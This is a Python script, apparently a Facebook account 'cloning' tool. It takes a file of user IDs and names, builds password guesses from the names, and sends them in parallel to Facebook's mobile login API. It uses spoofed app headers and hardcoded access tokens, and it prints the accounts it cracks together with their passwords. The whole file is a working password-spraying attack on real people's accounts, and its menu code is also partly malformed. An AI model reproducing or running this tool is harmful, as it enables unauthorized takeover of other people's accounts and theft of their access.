#_______modeule_______#
import os
from time import sleep as slp
from concurrent.futures import ThreadPoolExecutor as ted
import uuid
import random 
import httpx
import json
import sys
#------------[ HEART- ]--------------#
 
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[38;5;50m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
 
###----------[ ANSII COLOR STYLE ]---------- ###
 
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu
 
###----------[ RICH COLOR STYLE ]---------- ###
 
Z2 = "[#000000]" # Hitam
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
B2 = "[#00C8FF]" # Biru
U2 = "[#AF00FF]" # Ungu
N2 = "[#FF00FF]" # Pink
O2 = "[#00FFFF]" # Biru Muda
P2 = "[#FFFFFF]" # Putih
J2 = "[#FF8F00]" # Jingga
A2 = "[#AAAAAA]" # Abu-Abu
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ COLOUR ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
BU= '\033[1;34m';A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;46m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'

#####clear######
ualist=[]
loop=0
oks=[]
cps=[]
def clear():
	os.system("clear")
	print(logo)
#####linexxx----#
line = f"\033[1;38m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
#####my info####

logo = f"""
{G1}┳┓┏┓┳┓┏┓┓ ┳┓┏┓  
{G2}┣┫┃┃┃┃┣┫┃ ┃┃┃┃  
{G3}┛┗┗┛┛┗┛┗┗┛┻┛┗┛
\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m DEVELOPER   :  SAMARPAN GM
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m FACEBOOK    :  SAMARPAN JABEGU LIMBU
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m GITHUB      :  MR×SPJL
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m VERSION     :  1.0
\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;31m"""
#####line#######
def line():
	print(f"\033[1;38m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
#####menu#####

def menu():
	clear()
	line()
	print("<|> FILE CLONEING 1 ")
	print("<|> EXIT ")
	line()
	ronaldo=input("<|> CHOICE : ")
	if ronaldo in ['1','01']:
		file()
    elif ronaldo in ['2','02']:
        exit(' VAK MUGI 🖕 ')
        menu()
###
def file():
    clear()
    line()
    filex=input('<|> ENTER YOUR FILE  PATH : ')
    try:
        fo=open(filex,'r').read().splitlines()
    except FileNotFoundError:
        print('<|> FILE NOT FOUND');slp(2)
        file()
    clear()
    try:
        pas_limit=int(input('<|> ENTER PASSWORD LIMIT (1-20) : '))
    except:
        pas_limit=1
    line()
    pas_list=[]
    for i in range(pas_limit):
        pasx=input(f'<|> ENTER PASSWORD {i+1} : ')
        pas_list.append(pasx)
    with ted(max_workers=30) as Arafat:
        tl=str(len(fo))
        clear()
        print('<|> TOTAL ACCOUNT : '+tl)
        print('<|> IF YOU GET NO RESULTS USE BIMAN')
        line()
        for user in fo:
            ids,names=user.split('|')
            passlist=pas_list
            Arafat.submit(m1,ids,names,passlist)
    line()
    print('<|> THE CRACK PROCESS HAS BEEN END')
    input('<|> PRESS ENTER TO BACK : ')
    main()
#----------method------------#
def m1(ids,names,passlist):
    global oks,loop
    try:
        fn=names.split(' ')[0]
        try:
            ln=names.split(' ')[1]
        except:
            ln=fn
        for pw in passlist:
            sys.stdout.write('\r\r [<|> RONALDO <|>] %s|CRACKING:%s '%(loop,len(oks)));sys.stdout.flush()
            pas=pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            data={'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'fb_api_req_friendly_name': 'authenticate', 'api_key': '882a8490361da98702bf97a021ddc14d', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head={'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 11.0.0;   Build/R [FBAN/FB4A;FBAV/317.0.0.22377;FBBV/236731528;FBDM/{density=1.0,width=1080,height=1920};FBLC/en_US;FBRV/236731528;FBMF/AMR SAWYA;FBBD/A;FBPN/com.facebook.adsmanager;FBDV/ ;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
'Accept-Encoding': 'gzip, deflate', 
'Accept': '*/*', 
'Connection': 'close', 
'Content-Type': 'application/x-www-form-urlencoded', 
'Host': 'graph.facebook.com', 
'X-FB-Net-HNI': str(random.randint(20000,40000)), 
'X-FB-SIM-HNI': str(random.randint(20000,40000)), 
'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
'X-FB-Connection-Type': 'WIFI', 
'X-Tigon-Is-Retry': 'False', 
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 
'x-fb-device-group': str(random.randint(1000,9999)), 
'X-FB-Friendly-Name': 'ViewerReactionsMutation', 
'X-FB-Request-Analytics-Tags': 'graphservice', 
'X-FB-HTTP-Engine': 'Liger', 
'X-FB-Client-IP': 'True', 
'X-FB-Server-Cluster': 'True', 
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
            url='https://b-graph.facebook.com/auth/login'
            req=httpx.post(url,data=data,headers=head).json()
            if 'session_key' in req:
                print('\r\r\033[1;32m [<|> RONALDO OK <|>] '+ids+'|'+pas)
                oks.append(ids)
                break
            elif 'www.facebook.com' in req['error']['message']:
                print('\r\r\033[1;31m [<|> RONALDO OK <|>] '+ids+'|'+pas)
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
####
menu()









